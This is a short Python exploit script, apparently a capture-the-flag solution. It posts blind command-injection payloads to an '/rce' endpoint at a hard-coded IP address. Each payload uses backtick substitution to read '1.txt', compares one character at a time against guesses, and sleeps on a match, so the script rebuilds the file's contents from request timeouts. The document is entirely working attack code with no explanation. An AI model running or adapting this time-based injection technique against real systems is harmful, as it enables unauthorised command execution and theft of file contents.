import requests

url = "http://120.79.18.34:20650/rce"

strs = ""

dics = "abcdefgh ijklmnopqrstuvwxyz{}[].1234567890QAZWSXEDCRFVTGBYHNUJMIKOLP?-"
for num1 in range(0, 60):
    for st in dics:
        data = {
            'act': '1a=`cat 1.txt`;if [ "${'+'a:{}:'.format(num1)+'1}" == '+'"{}" ];then sleep 2;fi1'.format(st)
        }
        try:
            requests.post(url=url, data=data, timeout=1)
        except:
            print(num1)
            strs = strs+st
            print(strs)
print(strs)
